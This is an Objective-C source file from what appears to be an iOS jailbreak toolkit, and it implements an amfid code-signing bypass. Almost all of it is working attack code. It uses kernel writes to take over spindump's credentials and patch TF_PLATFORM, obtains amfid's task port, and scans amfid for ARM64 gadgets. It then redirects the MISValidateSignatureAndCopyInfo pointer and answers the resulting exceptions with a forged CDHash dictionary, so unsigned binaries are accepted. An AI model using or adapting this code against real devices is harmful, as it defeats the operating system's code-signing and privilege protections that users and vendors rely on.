//
//  amfid.m
//  reton
//
//  Created by Luca on 18.02.21.
//

#import <Foundation/Foundation.h>
#include "exploit/cicuta/cicuta_virosa.h"
#include "exploit_utilities.h"

#include "utils.h"
#include "k_utils.h"
#include "tq_common_p.h"
#include "kapi.h"

#include "log.hpp"
#include "util/mach_vm.h"
#include "manticore/amfid.h"

#include <mach/mach_traps.h>
#include <mach/vm_region.h>
#include <mach/vm_map.h>
#include <mach/mach_init.h>
#include <mach/host_special_ports.h>
#include <mach/mach_error.h>
#include <mach/mach_types.h>
#include <mach/mach.h>
#include <mach/mach_traps.h>

#include <mach-o/loader.h>

#include <stdio.h>
#include <stdlib.h>
#include <pthread/pthread.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <mach-o/nlist.h>
#include <errno.h>
#include <mach-o/getsect.h>
#include "k_offsets.h"
#include "kapi.h"
#include "kernel_utils.h"
#include "kutils.h"
#include "../include/lib/tq/utils.h"

#define TRUST_CDHASH_LEN (20)

pthread_attr_t pth_commAttr = {0};
size_t amfid_fsize = 0;

/* Spindump related variables */
uint64_t self_cached_creds = 0;
uint64_t spindump_proc_cred = 0;
pid_t spindump_pid = 0;

/* Amfid related variables */
mach_port_t amfid_exception_port = MACH_PORT_NULL;

void* rmem(mach_port_t tp, uint64_t addr, uint64_t len) {
    kern_return_t err;
    uint8_t* outbuf = (uint8_t*)malloc(len);
    vm_size_t outsize = len;
    
    err = vm_read_overwrite(tp, addr, len, (vm_address_t)outbuf, &outsize);
    if (err != KERN_SUCCESS) {
        (printf)("read failed\n");
        return NULL;
    }
    
    return outbuf;
}


bool check_if_amfid_has_entitParser(void){
    return true;
}

mach_port_t task_for_pid_workaround(int Pid){
    host_t        myhost = mach_host_self();
    mach_port_t   psDefault;
    mach_port_t   psDefault_control;
    task_array_t  tasks;
    mach_msg_type_number_t numTasks;
    int i;
    kern_return_t kr;
    kr = processor_set_default(myhost, &psDefault);

    kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
    if (kr != KERN_SUCCESS) { fprintf(stderr, "-> host_processor_set_priv failed with error %x\n", kr);
    mach_error("host_processor_set_priv",kr); exit(1);}
    kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
    if (kr != KERN_SUCCESS) { fprintf(stderr,"-> processor_set_tasks failed with error %x\n",kr); exit(1); }
    for (i = 0; i < numTasks; i++){
        int pid;
        pid_for_task(tasks[i], &pid);
        if (pid == Pid) return (tasks[i]);
    }

    return (MACH_PORT_NULL);
}

/*!
    @function safepatch_swap_spindump_cred
        @param target_proc
            target process to give creds to
        @abstract steal credentials of a child process to get rights for patching amfid
        @discussion safepatch_swap_spindump_cred
            Trying to spawn a new spindump process, as a pwnd child process
            swapping the credentials with spindump <-> ourproc should
            give us enough priviledges over the amfid process/task to
            set the exception handler and apply our patches
 
 */

void safepatch_swap_spindump_cred(uint64_t target_proc){
    if(spindump_proc_cred == 0){
        spindump_pid = 0;
        pid_t fpid = 0;
        printf("-> Swapping spindump credentials....\t%s\n", look_for_proc("/usr/sbin/spindump") ? "(Spindump running already)" : "(Spindump not running)");
        if(!(spindump_pid = look_for_proc("/usr/sbin/spindump"))){
            printf("-> Spawning spindump. This may take some time...\n");
            if((fpid = fork()) == 0){
                daemon(1, 1);
                close(STDIN_FILENO);
                close(STDOUT_FILENO);
                close(STDERR_FILENO);
                execvp("/usr/sbin/spindump", NULL);
                exit(1);
            } else if(g_exp.debug){ printf("-> error: %s (%d)\n", strerror(errno), fpid); }
            while(!(spindump_pid = look_for_proc("/usr/sbin/spindump"))){}
        }
        
        printf("-> Spindump process found:\n");
        printf("-> Pausing spindump process...\n");
        kill(spindump_pid, SIGSTOP);
        printf("-> Spindump pid:\t%d\n", spindump_pid);
        kptr_t spindump_proc = kproc_find_by_pid(spindump_pid);
        printf("-> Spindump proc:\t0x%llx\n", spindump_proc);
        kptr_t spindump_proc_cred = kapi_read_kptr(spindump_proc + OFFSET(proc, p_ucred));
        printf("-> Spindump cred:\t0x%llx\n", spindump_proc_cred);
        kptr_t target_task = kapi_read_kptr(target_proc + OFFSET(proc, task));
        printf("-> target task:\t\t0x%llx\n", target_task);
        printf("-> target proc:\t\t0x%llx\n", target_proc);
        if(patch_TF_PLATFORM(target_task)){
            printf("-> tf_platform patched successfully\n");
            self_cached_creds = kapi_read_kptr(target_proc + OFFSET(proc, p_ucred));
            if(kapi_write64(target_proc + OFFSET(proc, p_ucred), spindump_proc_cred)) printf("-> Successfully swapped spindump credentials.\n");
        } else {
            printf("-> failed to patch tf_platform!\n");
        }
    }
}

void safepatch_unswap_spindump_cred(uint64_t target_proc){
    if(spindump_proc_cred){
        kill(spindump_pid, SIGCONT);
        kill(spindump_pid, SIGKILL);
        spindump_pid = 0;
        spindump_proc_cred = 0;
    }
    if(kapi_write64(target_proc + OFFSET(proc, p_ucred), self_cached_creds)) printf("-> Successfully swapped spindump credentials.\n");
}


void pth_commAttr_init(){
    pthread_attr_init(&pth_commAttr);
    pthread_attr_setdetachstate(&pth_commAttr, PTHREAD_CREATE_DETACHED);
}

uint8_t *map_file_to_mem(const char *path){
    struct stat fstat = {0};
    stat(path, &fstat);
    amfid_fsize = fstat.st_size;
    
    int fd = open(path, O_RDONLY);
    uint8_t *mapping_mem = (uint8_t*)mmap(NULL, mach_vm_round_page(amfid_fsize), PROT_READ, MAP_SHARED, fd, 0);
    if((uintptr_t)mapping_mem == -1){
        printf("Error in map_file_to_mem(): mmap() == -1\n");
        exit(1);
    }
    return mapping_mem;
}

uint64_t find_amfid_OFFSET_gadget(uint8_t *amfid_macho){
    const char *_segment = "__TEXT", *_section = "__text";
    const struct section_64 *sect_info = getsectbynamefromheader_64((const struct mach_header_64 *)amfid_macho, _segment, _section);
    if(!sect_info){
        printf("Error in find_amfid_OFFSET_gadget(): if(!sect_info)\n");
        exit(1);
    }
    unsigned long sect_size = 0;
    uint64_t sect_data = (uint64_t)getsectiondata((const struct mach_header_64 *)amfid_macho, _segment, _section, &sect_size);
    
    unsigned char _bytes_gadget[] = {
        0x08, 0x29, 0x09, 0x9B, // madd        x8, x8, x9, x10
        0x00, 0x15, 0x40, 0xF9, // ldr         x0, [x8, #0x28]
        0xC0, 0x03, 0x5F, 0xD6, // ret
    };
    
    unsigned char _bytes_gadget2[] = {
        0x08, 0x25, 0x2A, 0x9B, // smaddl      x8, w8, w10, x9
        0x00, 0x15, 0x40, 0xF9, // ldr         x0, [x8, #0x28]
        0xC0, 0x03, 0x5F, 0xD6, // ret
    };
    
    unsigned char _bytes_gadget3[] = {
        0x08, 0xbd, 0x48, 0xca, // eor        x8, x8, x8, lsr #47
        0x00, 0x7d, 0x00, 0x9b, // mul        x0, x8, x9
        0xc0, 0x03, 0x5f, 0xd6, // ret
        0x68, 0x4e, 0x9e, 0xd2,
    };
    
    printf("-> Looking for needle #1");
    uint64_t find_gadget = (uint64_t)memmem((void*)sect_data, sect_size, &_bytes_gadget, sizeof(_bytes_gadget));
    printf("\t--->\t0x%llx\n", find_gadget);
    if(find_gadget == 0){
        printf("-> Looking for needle #2");
        find_gadget = (uint64_t)memmem((void*)sect_data, sect_size, &_bytes_gadget2, sizeof(_bytes_gadget2));
        printf("\t--->\t0x%llx\n", find_gadget);
    } if(find_gadget == 0){
        printf("-> Looking for needle #3");
        find_gadget = (uint64_t)memmem((void*)sect_data, sect_size, &_bytes_gadget3, sizeof(_bytes_gadget3));
        printf("\t--->\t0x%llx\n", find_gadget);
    } if(find_gadget == 0){
        printf("--> Could not find the needle with the given gadget!\n");
    }
    
    return (find_gadget - sect_data) + sect_info->offset;
}



uint64_t find_amfid_OFFSET_MISValidate_symbol(uint8_t *amfid_macho){
    uint32_t MISValidate_symIndex = 0;
    struct mach_header_64 *mh = (struct mach_header_64*)amfid_macho;
    const uint32_t cmd_count = mh->ncmds;
    struct load_command *cmds = (struct load_command*)(mh + 1);
    struct load_command* cmd = cmds;
    for (uint32_t i = 0; i < cmd_count; ++i){
        switch (cmd->cmd) {
            case LC_SYMTAB:{
                struct symtab_command *sym_cmd = (struct symtab_command*)cmd;
                uint32_t symoff = sym_cmd->symoff;
                uint32_t nsyms = sym_cmd->nsyms;
                uint32_t stroff = sym_cmd->stroff;
                
                for(int i =0;i<nsyms;i++){
                    struct nlist_64 *nn = (nlist_64*)((char*)mh+symoff+i*sizeof(struct nlist_64));
                    char *def_str = NULL;
                    if(nn->n_type==0x1){
                        // 0x1 indicates external function
                        def_str = (char*)mh+(uint32_t)nn->n_un.n_strx + stroff;
                        if(!strcmp(def_str, "_MISValidateSignatureAndCopyInfo")){
                            break;
                        }
                    }
                    if(i!=0 && i!=1){ // Two at beginning are local symbols, they don't count
                        MISValidate_symIndex++;
                    }
                }
            }
                break;
        }
        cmd = (struct load_command*)((char*)cmd + cmd->cmdsize);
    }
    
    if(MISValidate_symIndex == 0){
        printf("Error in find_amfid_OFFSET_MISValidate_symbol(): MISValidate_symIndex == 0\n");
        exit(1);
    }
    
    const struct section_64 *sect_info = NULL;
    if(g_exp.has_PAC){
        const char *_segment = "__DATA_CONST", *_segment2 = "__DATA", *_section = "__auth_got";
        // _segment for iOS 13, _segment2 for <= iOS 12
        sect_info = getsectbynamefromheader_64((const struct mach_header_64 *)amfid_macho, _segment, _section);
        if(!sect_info)
            sect_info = getsectbynamefromheader_64((const struct mach_header_64 *)amfid_macho, _segment2, _section);
    }else{
        const char *_segment = "__DATA", *_section = "__la_symbol_ptr";
        sect_info = getsectbynamefromheader_64((const struct mach_header_64 *)amfid_macho, _segment, _section);
    }
    
    if(!sect_info){
        printf("Error in find_amfid_OFFSET_MISValidate_symbol(): if(!sect_info)\n");
        exit(1);
    }
    
    return sect_info->offset + (MISValidate_symIndex * 0x8);
}

/**
	binary_load_address(mach_port_t target_port) ---> returns kptr_t object/addresss
		 Function to find the binary load address of amfid in memory.
**/


kptr_t binary_load_address(mach_port_t target_port){
    kern_return_t err;
    mach_msg_type_number_t region_count = VM_REGION_BASIC_INFO_COUNT_64;
    memory_object_name_t object_name = MACH_PORT_NULL;
    mach_vm_size_t target_first_size = 0x1000;
    mach_vm_address_t target_first_addr = 0x0;
    struct vm_region_basic_info_64 region = {0};
    
    err = mach_vm_region(target_port,
                         &target_first_addr,
                         &target_first_size,
                         VM_REGION_BASIC_INFO_64,
                         (vm_region_info_t)&region,
                         &region_count,
                         &object_name);
    
    if (err != KERN_SUCCESS) {
        printf("failed to get the region err: %d\t(%s)\n", err, mach_error_string(err));
        return 0;
    }
    
    return target_first_addr;
}

void *Build_ValidateSignature_dic(uint8_t *input_cdHash, size_t *out_size, uint64_t shadowp){
    // Build a self-contained, remote-address-adapted CFDictionary instance

    CFDataRef _cfhash_cfdata = CFDataCreate(kCFAllocatorDefault, input_cdHash, TRUST_CDHASH_LEN);
    void *cfhash_cfdata = (void*)_cfhash_cfdata;
    const char *iomatch_key = "CdHash";

    size_t key_len = strlen(iomatch_key) + 0x11;
    key_len = (~0xF) & (key_len + 0xF);
    size_t value_len = 0x60; // size of self-contained CFData instance
    value_len = (~0xF) & (value_len + 0xF);
    size_t total_len = key_len + value_len + 0x20;

    *out_size = total_len;
    char *writep = (char *)calloc(1, total_len);

    char *realCFString = (char*)CFStringCreateWithCString(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", kCFStringEncodingUTF8);
    const char *keys[] = {realCFString};
    const char *values[] = {realCFString};
    char *realCFDic = (char*)CFDictionaryCreate(0, (const void**)keys, (const void**)values, 1, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFRetain(realCFDic); // Pump in some extra lifes
    CFRetain(realCFDic);
    CFRetain(realCFDic);
    CFRetain(realCFDic);
    memcpy(writep, realCFDic, 0x20);

    writep = writep + total_len - value_len;
    shadowp = shadowp + total_len - value_len;
    uint64_t value = shadowp;
    memcpy(writep, cfhash_cfdata, 0x60);
    CFRelease(cfhash_cfdata);

    writep -= key_len;
    shadowp -= key_len;
    uint64_t key = shadowp;
    *(uint64_t*)(writep) = *(uint64_t*)realCFString;
    *(uint64_t*)(writep + 8) = *(uint64_t*)(realCFString + 8);
    *(uint8_t*)(writep + 16) = strlen(iomatch_key);
    memcpy(writep + 17, iomatch_key, strlen(iomatch_key));

    writep -= 0x20;
    shadowp -= 0x20;
    *(uint64_t*)(writep + 0x8) = value;
    *(uint64_t*)(writep + 0x10) = key;

    CFRelease(realCFDic);
    CFRelease(realCFDic);
    CFRelease(realCFDic);
    CFRelease(realCFDic);
    CFRelease(realCFDic);
    CFRelease(realCFString);

    return writep;
}


#pragma pack(4)
typedef struct {
    mach_msg_header_t Head;
    mach_msg_body_t msgh_body;
    mach_msg_port_descriptor_t thread;
    mach_msg_port_descriptor_t task;
    NDR_record_t NDR;
} exception_raise_request; // the bits we need at least

typedef struct {
    mach_msg_header_t Head;
    NDR_record_t NDR;
    kern_return_t RetCode;
} exception_raise_reply;
#pragma pack()

uint64_t reserved_mem_in_amfid = 0;
uint64_t update_cdhash_in_amfid = 0;
uint64_t update_retainCnt_in_amfid = 0;
void* amfid_exception_handler(void* arg){
    uint32_t size = 0x1000;
    mach_msg_header_t* msg = (mach_msg_header_t*)malloc(size);
        for(;;){
            kern_return_t err;
            printf("calling mach_msg to receive exception message from amfid\n");
            err = mach_msg(msg,
                           MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE, // no timeout
                           0,
                           size,
                           amfid_exception_port,
                           0,
                           0);
            if (err != KERN_SUCCESS){
                printf("error receiving on exception port: %s\n", mach_error_string(err));
            } else {
                (printf)("got exception message from amfid!\n");
                
                exception_raise_request* req = (exception_raise_request*)msg;
                
                mach_port_t thread_port = req->thread.name;
                mach_port_t task_port = req->task.name;
                _STRUCT_ARM_THREAD_STATE64 old_state = {0};
                mach_msg_type_number_t old_stateCnt = sizeof(old_state)/4;
                err = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt);
                if (err != KERN_SUCCESS){
                    printf("error getting thread state: %s\n", mach_error_string(err));
                    continue;
                }
                
                _STRUCT_ARM_THREAD_STATE64 new_state;
                memcpy(&new_state, &old_state, sizeof(_STRUCT_ARM_THREAD_STATE64));
                
                // get the filename pointed to by X23 (or x24 after iOS 13.5)
                char* filename = (char*)rmem(task_port, check_if_amfid_has_entitParser()?new_state.__x[24]:new_state.__x[23], 1024);
                (printf)("got filename for amfid request: %s\n", filename);

                uint8_t *cdhash = (uint8_t *)CDHashFor(filename);
                if(cdhash){
                    uint32_t offset_to_store = 0x50;
                    if(reserved_mem_in_amfid == 0){
                        // Allocate a page of memory in amfid, where we stored cfdic for bypass signature valid
                        vm_allocate(task_port, (vm_address_t*)&reserved_mem_in_amfid, 0x4000, VM_FLAGS_ANYWHERE);
                        (printf)("reserved_mem_in_amfid: 0x%llx\n", reserved_mem_in_amfid);
                        
                        kapi_write64(reserved_mem_in_amfid + 0x28, 0);
                        size_t out_size = 0;
                        char *fakedic = (char *)Build_ValidateSignature_dic(cdhash, &out_size, reserved_mem_in_amfid + offset_to_store);
                        kapi_write(reserved_mem_in_amfid + offset_to_store, fakedic, (uint32_t)out_size);
                        update_cdhash_in_amfid = reserved_mem_in_amfid + offset_to_store + 0x70; // To update cdhash in the same cfdic
                        update_retainCnt_in_amfid = *(uint64_t*)(fakedic); // To keep dic away from being release
                        free(fakedic);
                    }
                    else{
                        if(cdhash){
                            for (int i = 0; i < TRUST_CDHASH_LEN; i++){
                                kapi_write((kptr_t)(update_cdhash_in_amfid + i), (void*)cdhash[i], (sizeof(cdhash[i])));
                            }
                            kapi_write64(reserved_mem_in_amfid + offset_to_store, update_retainCnt_in_amfid);
                        }
                    }
                    free(cdhash);
                }
                kapi_write64(old_state.__x[2], reserved_mem_in_amfid + 0x50);
                new_state.__x[8] = reserved_mem_in_amfid; // For the next encouter instr: LDR  X0, [X8,#0x28] <- Clear out X0 as success return
                
                
                // set the new thread state:
                err = thread_set_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&new_state, sizeof(new_state)/4);
                
                exception_raise_reply reply = {0};
                
                reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(req->Head.msgh_bits), 0);
                reply.Head.msgh_size = sizeof(reply);
                reply.Head.msgh_remote_port = req->Head.msgh_remote_port;
                reply.Head.msgh_local_port = MACH_PORT_NULL;
                reply.Head.msgh_id = req->Head.msgh_id + 100;
                
                reply.NDR = req->NDR;
                reply.RetCode = KERN_SUCCESS;
                
                err = mach_msg(&reply.Head,
                               MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                               (mach_msg_size_t)sizeof(reply),
                               0,
                               MACH_PORT_NULL,
                               MACH_MSG_TIMEOUT_NONE,
                               MACH_PORT_NULL);
                mach_port_deallocate(mach_task_self(), thread_port);
                mach_port_deallocate(mach_task_self(), task_port);
            }
        }
    return NULL;
}

void set_exception_handler(mach_port_t amfid_task_port){
    kern_return_t ret = 0;
    if(!MACH_PORT_VALID(amfid_task_port)){
        printf("Invalid amfid task port!\n");
        return;
    }
    
    // allocate a port to receive exceptions on and assign rights:
    if((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amfid_exception_port)) != KERN_SUCCESS) printf("Allocating a new task port failed.\t(%d)\n", ret);
    if((ret = mach_port_insert_right(mach_task_self(), amfid_exception_port, amfid_exception_port, MACH_MSG_TYPE_MAKE_SEND)) != KERN_SUCCESS) printf("Inserting rights to amfid_exception_port failed.\t(%d)\n", ret);

    
    
    if(!MACH_PORT_VALID(amfid_exception_port)){
        printf("Invalid amfid exception handler port!\n");
        return;
    }
    
    printf("--> Attempting to set exception handler...\t(0x%x --> 0x%x)\n", amfid_exception_port, amfid_task_port);
    
    kern_return_t err = task_set_exception_ports(amfid_task_port,
                                                 EXC_MASK_ALL,
                                                 amfid_exception_port,
                                                 EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES,  // we want to receive a catch_exception_raise message with the thread port for the crashing thread
                                                 6);
    
    if (err != KERN_SUCCESS){
        (printf)("--> Error setting amfid exception port: %s\t(%d)\n", mach_error_string(err), err);
    } else {
        (printf)("--> Set amfid exception port: succeed!\n");
        pthread_t exception_thread;
        pthread_create(&exception_thread, &pth_commAttr, amfid_exception_handler, NULL);
    }
}

/***
 Replace the Original Amfid task port with a custom one, created by us. (https://github.com/bazad/blanket/blob/22d670d25b8ab5ad569c3f8f4de108ae8e0b6e0a/amfidupe/amfidupe.c#L93)
 */

bool replace_amfid_port(){
	mach_port_t real_amfid_port, fake_amfid_port;
	mach_port_t host = mach_host_self();
	kern_return_t kr = host_get_amfid_port(host, &real_amfid_port);
	if (kr != KERN_SUCCESS) {
		manticore_error("Could not get amfid's service port!\n");
		return false;
	}
	mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
	kr = mach_port_construct(mach_task_self(), &options, 0, &fake_amfid_port);
	if (kr != KERN_SUCCESS) {
		manticore_error("Could not create fake amfid port!\n");
		return false;
	}
	kr = host_set_amfid_port(host, fake_amfid_port);
	if (kr != KERN_SUCCESS) {
		manticore_error("Could not register fake amfid port: error %d\n", kr);
		return false;
	}
	manticore_info("Registered new amfid port: 0x%x\n", fake_amfid_port);
	return true;
}

kptr_t perform_amfid_patches(){
    if(getuid() != 0) return 0;
    printf("* ------- AMFID Patches -------- *\n");
    uint8_t *amfid_fdata = map_file_to_mem("/usr/libexec/amfid");
    printf("Extracted AMFID Offsets:\n\n");
    /** Finding Amfid related offsets */
    kptr_t amfid_OFFSET_MISValidate_symbol = find_amfid_OFFSET_MISValidate_symbol(amfid_fdata);
    printf("----> MISValidate:\t0x%llx\n", amfid_OFFSET_MISValidate_symbol);
    kptr_t amfid_OFFSET_gadget = find_amfid_OFFSET_gadget(amfid_fdata);
    printf("----> AMFID Gadget:\t0x%llx\n", amfid_OFFSET_gadget);
    
    /** Map amfid to local memory */
    mach_port_t amfid_task_port = MACH_PORT_NULL;
    pid_t amfid_pid = look_for_proc("/usr/libexec/amfid");
    munmap(amfid_fdata, amfid_fsize);

    /** Swap Spindump creds with local ones */
    safepatch_swap_spindump_cred(g_exp.self_proc);
    
    mach_port_t remoteTask = task_for_pid_workaround(amfid_pid);

    kern_return_t ret = host_get_amfid_port(mach_host_self(), &amfid_task_port);
    if(ret == KERN_SUCCESS){
        printf("----> AMFID Task:\t0x%llx\t\t\t(from proc)\n", kproc_find_by_pid(amfid_pid) + OFFSET(proc, task));
        printf("----> AMFID Port:\t0x%x\n", remoteTask);
        set_exception_handler(remoteTask);
        kptr_t amfid_base = binary_load_address(remoteTask);
        printf("----> AMFID base:\t0x%llx\n", amfid_base);
        vm_protect(remoteTask, mach_vm_trunc_page(amfid_base + amfid_OFFSET_MISValidate_symbol), 0x4000, false, VM_PROT_READ|VM_PROT_WRITE);
        uint64_t redirect_pc = amfid_base + amfid_OFFSET_gadget;
        kapi_write64(amfid_base + amfid_OFFSET_MISValidate_symbol, redirect_pc);
        safepatch_unswap_spindump_cred(g_exp.self_proc);
    } else manticore_error("Could not get amfid's service port!\n");
    return 0;
}
